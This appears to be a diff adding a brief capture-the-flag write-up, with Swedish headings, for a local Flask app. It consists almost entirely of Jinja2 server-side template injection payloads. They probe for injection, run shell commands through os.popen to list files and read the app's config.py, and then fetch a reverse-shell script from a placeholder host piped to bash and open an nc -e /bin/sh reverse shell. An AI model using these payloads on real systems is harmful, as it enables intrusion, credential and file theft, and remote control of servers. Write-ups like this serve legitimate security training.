@@ -1,0 +1,18 @@
+## Writeup
+
+1 RECON: http://127.0.0.1:5000/%7B%7B7*7%7D%7D
+
+
+2 RCE: 127.0.0.1:5000/{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+
+http://127.0.0.1:5000/data%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('cat%20flaskpost/config.py').read()%7D%7D
+
+3 more cool stuff?: 
+
+http://127.0.0.1:5000/{{request.application.__globals__.__builtins__.__import__('os').popen('curl IP/revshell | bash').read()}}
+http://127.0.0.1:5000/%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('nc%20-e%20/bin/sh%20127.0.0.1%204000').read()%7D%7D
+
+## Flagga
+
+Flaggan finns i `flaskpost/config.py`
+
